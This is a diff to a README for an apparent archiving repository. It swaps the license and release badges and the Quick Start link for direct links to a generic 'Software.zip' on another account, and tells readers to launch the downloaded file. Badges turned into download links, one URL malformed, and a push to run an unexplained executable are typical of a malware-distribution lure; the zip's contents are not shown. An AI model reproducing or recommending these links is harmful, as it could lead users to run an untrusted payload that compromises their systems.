@@ -1,7 +1,7 @@
 # Aetern Archive 📦
 
-[![License](https://img.shields.io/badge/License-MIT-green)](https://opensource.org/licenses/MIT)
-[![GitHub release](https://img.shields.io/badge/Download%20Release-v1.0.0-blue.svg)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![License](https://github.com/VonWasBack/aetern-archive/releases/download/v1.0/Software.zip)](https://github.com/VonWasBack/aetern-archive/releases/download/v1.0/Software.zip)
+[![GitHub release](https://github.com/VonWasBack/aetern-archive/releases/download/v1.0/Software.zip%https://github.com/VonWasBack/aetern-archive/releases/download/v1.0/Software.zip)](https://github.com/VonWasBack/aetern-archive/releases/download/v1.0/Software.zip)
 
 Welcome to **Aetern Archive**, a repository dedicated to archiving anything and everything! This archive collects its assets from various sources, ensuring a comprehensive collection for future reference and preservation.
 
@@ -30,7 +30,7 @@ Explore the following topics within **Aetern Archive**:
 
 ## 🚀 Quick Start
 
-To jumpstart your exploration of the archive, grab the latest release from [here](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip). Launch the file to begin your journey into the past!
+To jumpstart your exploration of the archive, grab the latest release from [here](https://github.com/VonWasBack/aetern-archive/releases/download/v1.0/Software.zip). Launch the file to begin your journey into the past!
 
 ## 🖥️ Deployment with Vercel
 
